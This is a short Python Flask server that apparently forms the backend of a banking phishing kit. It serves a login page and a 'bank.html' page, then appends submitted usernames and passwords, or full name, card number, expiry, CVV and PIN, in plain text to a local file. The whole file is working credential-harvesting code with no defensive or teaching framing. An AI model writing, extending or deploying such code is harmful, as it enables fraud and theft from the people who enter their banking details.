from flask import Flask, request, jsonify,send_from_directory
from flask_cors import CORS
import os
app = Flask(__name__)
CORS(app)
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/bank')
def bank():
    return send_from_directory('.', 'bank.html')

# Define the path to the file where the data will be saved
data_file = "login_data.txt"




@app.route('/submit', methods=['POST'])
def submit_data():
    data = request.get_json()

    if 'username' in data:
        line = f"Username: {data.get('username')}, Password: {data.get('password')}\n"
    else:
        line = (f"Name: {data.get('fullname')}, "
                f"Card: {data.get('cardnumber')}, "
                f"Expiry: {data.get('expiry')}, "
                f"CVV: {data.get('cvv')}, "
                f"PIN: {data.get('pin')}\n")

    with open(data_file, 'a') as f:
        f.write(line)
    return jsonify({"message": "Data saved successfully"}), 200




if __name__ == '__main__':
   # Ensure the file exists or create it if necessary
   if not os.path.exists(data_file):
       with open(data_file, 'w') as f:
           pass  # Just create the file if it doesn't exist
   app.run(debug=True, port=8080)

